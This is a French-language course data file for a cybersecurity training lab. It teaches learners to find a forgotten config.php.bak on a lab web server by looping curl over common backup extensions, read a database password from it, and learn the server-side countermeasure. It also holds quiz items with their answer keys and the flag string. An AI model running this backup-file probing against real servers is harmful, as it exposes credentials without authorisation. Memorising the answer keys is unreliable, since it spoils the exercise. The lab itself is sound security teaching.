import type { CourseSeed } from "../../../types";

/** Cyber · Pratique — Module 28 : découverte d'un fichier de config de sauvegarde oublié. Lab Docker réel. */
export const module28BackupFileDiscovery: CourseSeed[] = [
  {
    slug: "prat-backup-file-discovery",
    title: "Fichier de sauvegarde oublié",
    checkpoint: "prat-recon-web",
    codename: "Silent Backup",
    domain: "Reconnaissance web",
    theme: "grid",
    icon: "FolderTree",
    accent: "#6BC4B2",
    order: 28,
    difficulty: "medium",
    summary:
      "Un commentaire dans le code source mentionne un fichier de configuration. La requête directe échoue (404) — mais les éditeurs de texte laissent souvent des copies derrière eux (.bak, .old, ~, .swp). Un court fuzzing d'extensions révèle la sauvegarde, et avec elle le mot de passe de la base.",
    objectives: [
      "Repérer un indice de configuration dans le code source d'une page",
      "Constater qu'une requête directe sur le fichier échoue (404)",
      "Fuzzer les extensions de sauvegarde courantes",
      "Récupérer la sauvegarde et son secret",
      "Comprendre qu'une ressource non liée reste accessible",
    ],
    sandbox: {
      attackerImage: "cyberace/attacker-base:latest",
      targetImage: "cyberace/module28-backup-file:latest",
      ttlSec: 900,
      attackerCapAdd: [],
      ports: [{ containerPort: 7681, label: "Terminal web (ttyd)" }],
    },
    lesson: `# 🌲 Fichier de sauvegarde oublié — Silent Backup

Les éditeurs de texte sont des **bavards** : ils laissent des **copies** derrière eux (\`.bak\`, \`.old\`, \`~\`, \`.swp\`). Sur un serveur web, ces reliquats peuvent livrer des **secrets**. 🏎️

---

## 🧭 Le briefing

> Un **commentaire** dans le code source d'une page mentionne un **fichier de configuration**. La requête directe **échoue** — mais les éditeurs de texte laissent souvent des **copies** derrière eux.

Tu es l'attaquant, avec \`curl\`.

---

## 1. L'indice dans le code source 🔍

\`\`\`bash
curl http://target:8080/
\`\`\`

Le HTML contient un **commentaire** :

\`\`\`html
<!-- config: voir config.php pour les parametres de connexion -->
\`\`\`

Il révèle l'existence d'un fichier \`config.php\`.

---

## 2. La requête directe échoue 🚫

\`\`\`bash
curl -i http://target:8080/config.php
\`\`\`

**404 Not Found.** Le fichier \`config.php\` « original » n'existe pas (ou n'est plus servi). Mais…

---

## 3. Fuzzer les extensions de sauvegarde 🧪

Les éditeurs créent des copies avec des suffixes typiques. Teste-les en boucle :

\`\`\`bash
for ext in .bak .old .orig .swp ~ .save; do
  echo "$ext: $(curl -s -o /dev/null -w '%{http_code}' http://target:8080/config.php$ext)"
done
\`\`\`

Un seul suffixe renvoie **200** : \`.bak\`. La sauvegarde \`config.php.bak\` est **servie**.

---

## 4. Récupérer le secret 🎯

\`\`\`bash
curl http://target:8080/config.php.bak
\`\`\`

\`\`\`php
<?php $db_pass = "CYBERACE{...}"; ?>
\`\`\`

Le mot de passe de la base — le flag — était dans une **copie oubliée**.

---

## 5. La contre-mesure 🛡️

Configurer le serveur web pour **refuser explicitement** de servir les fichiers de sauvegarde/temporaires (\`.bak\`, \`.old\`, \`~\`, \`.swp\`…), **quel que soit** leur emplacement. Et, bien sûr, ne jamais laisser traîner ces copies en production.

---

## 🧠 À retenir

- Les éditeurs laissent des **copies** (\`.bak\`, \`.old\`, \`~\`, \`.swp\`).
- Une requête **404** sur l'original ne signifie **pas** l'absence de **sauvegarde**.
- Un **fuzzing** d'extensions révèle les copies servies par erreur.
- Parade : **refuser** de servir ces extensions côté serveur + ne pas les laisser en prod.`,
    badge: {
      id: "badge-prat-backup",
      name: "Fouilleur de Sauvegardes",
      icon: "FolderTree",
      description: "A retrouvé un fichier de configuration que personne ne pensait plus accessible.",
    },
    challenges: [
      {
        id: "prat-backup-t1",
        title: "Premier contact",
        order: 1,
        difficulty: "easy",
        type: "text",
        prompt: `## 👋 Premier contact

Démarre le lab. Récupère la page :

\`\`\`bash
curl http://target:8080/
\`\`\`

**Question :** quel **outil en ligne de commande** récupère le contenu d'une URL ?`,
        points: 50,
        timeLimitSec: 200,
        hints: [],
        answer: "curl",
        caseSensitive: false,
        explanation: `**\`curl\`** télécharge la page. Regarde attentivement son **code source** : un commentaire s'y cache.`,
        tags: ["backup", "curl", "recon"],
      },
      {
        id: "prat-backup-t2",
        title: "L'indice dans le code source",
        order: 2,
        difficulty: "easy",
        type: "text",
        prompt: `## 🔍 L'indice

Lis le commentaire HTML de la page.

**Question :** quel **nom de fichier** de configuration est mentionné dans le code source ?`,
        points: 100,
        timeLimitSec: 300,
        hints: [],
        answer: "config.php",
        caseSensitive: false,
        explanation: `Le commentaire \`<!-- config: voir config.php ... -->\` révèle l'existence de **\`config.php\`**.`,
        tags: ["backup", "indice"],
      },
      {
        id: "prat-backup-t3",
        title: "Confirmer l'absence directe",
        order: 3,
        difficulty: "easy",
        type: "mcq",
        prompt: `## 🚫 La requête directe

\`\`\`bash
curl -i http://target:8080/config.php
\`\`\`

**Question :** quel **code de statut** renvoie une requête directe sur ce fichier ?`,
        points: 100,
        timeLimitSec: 300,
        hints: [],
        options: ["404 Not Found", "200 OK", "403 Forbidden", "500 Internal Server Error"],
        answer: 0,
        explanation: `**404 Not Found** : l'original \`config.php\` n'est pas servi. Mais l'absence de l'original ne dit rien des **copies** de sauvegarde.`,
        tags: ["backup", "404"],
      },
      {
        id: "prat-backup-t4",
        title: "Fuzzer les extensions de sauvegarde",
        order: 4,
        difficulty: "hard",
        type: "text",
        prompt: `## 🧪 Fuzzer les extensions

\`\`\`bash
for ext in .bak .old .orig .swp ~ .save; do
  echo "$ext: $(curl -s -o /dev/null -w '%{http_code}' http://target:8080/config.php$ext)"
done
\`\`\`

**Question :** quelle **extension**, une fois ajoutée, renvoie un 200 OK ?`,
        points: 250,
        timeLimitSec: 600,
        hints: [
          { text: "Relis attentivement chaque code retourné par la boucle : un seul diffère des autres (200 au lieu de 404).", cost: 20 },
        ],
        answer: ".bak",
        caseSensitive: false,
        explanation: `L'extension **\`.bak\`** renvoie **200** : la sauvegarde \`config.php.bak\` est bien servie, contrairement à l'original.`,
        tags: ["backup", "fuzzing"],
      },
      {
        id: "prat-backup-t5",
        title: "Récupérer le flag",
        order: 5,
        difficulty: "hard",
        type: "text",
        prompt: `## 🎯 Récupérer le flag

\`\`\`bash
curl http://target:8080/config.php.bak
\`\`\`

**Question :** colle le **flag** trouvé dans la sauvegarde.`,
        points: 250,
        timeLimitSec: 400,
        hints: [],
        answer: "CYBERACE{fichier_bak_oublie_sur_le_serveur}",
        caseSensitive: true,
        explanation: `\`config.php.bak\` contient \`$db_pass = "CYBERACE{fichier_bak_oublie_sur_le_serveur}"\` — le secret survivait dans une **copie oubliée**.`,
        tags: ["backup", "flag"],
      },
      {
        id: "prat-backup-t6",
        title: "Contre-mesure",
        order: 6,
        difficulty: "medium",
        type: "mcq",
        prompt: `## 🛡️ Contre-mesure

**Question :** quelle mesure aurait empêché cette fuite ?`,
        points: 150,
        timeLimitSec: 300,
        hints: [],
        options: [
          "Configurer le serveur web pour refuser explicitement de servir les fichiers de sauvegarde/temporaires (.bak, .old, ~, .swp), quel que soit leur emplacement",
          "Renommer config.php en config2.php",
          "Supprimer uniquement le commentaire dans le HTML",
          "Ajouter un mot de passe à l'éditeur de texte",
        ],
        answer: 0,
        explanation: `Le serveur doit **refuser** de servir les extensions de sauvegarde/temporaires. Renommer ou retirer le commentaire ne fait que déplacer le problème — la copie resterait accessible à qui devine son nom.`,
        tags: ["backup", "contre-mesure"],
      },
      {
        id: "prat-backup-t7",
        title: "Synthèse",
        order: 7,
        difficulty: "easy",
        type: "mcq",
        prompt: `## 🎓 Synthèse

**Question :** en quoi ce module reprend-il l'esprit du Module 11 (vhost caché) ?`,
        points: 50,
        timeLimitSec: 200,
        hints: [],
        options: [
          "Le fuzzing d'une petite liste de possibilités (extensions ici, noms d'hôtes là-bas) révèle une ressource jamais officiellement exposée",
          "Les deux modules utilisent exactement la même liste de valeurs à tester",
          "Ce module nécessite un certificat TLS, contrairement au Module 11",
          "Il n'y a aucun lien entre les deux modules",
        ],
        answer: 0,
        explanation: `Comme le Module 11 fuzzait des **noms d'hôtes**, ce module fuzz des **extensions**. Même esprit : essayer une courte liste de possibilités pour révéler une ressource **non liée** mais accessible.`,
        tags: ["backup", "synthese"],
      },
    ],
  },
];
